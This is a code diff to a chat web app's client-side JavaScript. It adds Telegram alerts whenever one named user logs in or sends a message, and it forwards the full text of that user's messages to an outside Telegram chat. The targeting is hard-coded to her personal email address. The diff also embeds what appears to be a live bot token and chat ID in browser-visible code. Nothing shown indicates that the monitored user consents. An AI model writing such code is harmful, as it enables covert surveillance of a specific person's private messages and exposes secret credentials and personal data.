@@ -44,6 +44,7 @@ window.login = async function () {
 
     currentUserEmail = data.user.email;
 
+    // Telegram notification for Aya login
     if (currentUserEmail === "ayaessam487@gmail.com") {
         sendTelegramNotification("Aya just logged in!");
     }
@@ -51,7 +52,7 @@ window.login = async function () {
     document.getElementById("login").style.display = "none";
     document.getElementById("chat").style.display = "flex";
 
-    // Notifications
+    // Notifications permission
     if (Notification.permission !== "granted") {
         await Notification.requestPermission();
     }
@@ -148,6 +149,11 @@ async function joinChat(email) {
 
             notifyUser(USER_NAMES[sender] || sender, text);
         }
+
+        // ✅ Telegram notification if Aya sends a message
+        if (sender === "ayaessam487@gmail.com") {
+            sendTelegramNotification(`Aya sent a message: ${text}`);
+        }
     });
 
     channel.subscribe(status => {
@@ -186,7 +192,7 @@ window.send = async function () {
         read: false
     });
 
-    // Broadcast
+    // Broadcast to other users
     channel.send({
         type: "broadcast",
         event: "message",
@@ -197,6 +203,11 @@ window.send = async function () {
             created_at: inserted.created_at
         }
     });
+
+    // ✅ Telegram notification if current user is Aya
+    if (currentUserEmail === "ayaessam487@gmail.com") {
+        sendTelegramNotification(`Aya sent a message: ${text}`);
+    }
 
     input.value = "";
 };
@@ -278,17 +289,23 @@ document.getElementById("panic-btn").addEventListener("click", () => {
     }
 });
 
-
+/* =========================
+   TELEGRAM NOTIFICATION
+========================= */
 async function sendTelegramNotification(message) {
     const chatId = "5637769598";       // Replace with your chat ID
     const botToken = "8551799267:AAF3DHlffeUhTCWYV5J5c0AoYRbDmfNkodo";   // Replace with your bot token
 
-    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-        })
-    });
+    try {
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        });
+    } catch (err) {
+        console.error("Telegram notification failed:", err);
+    }
 }
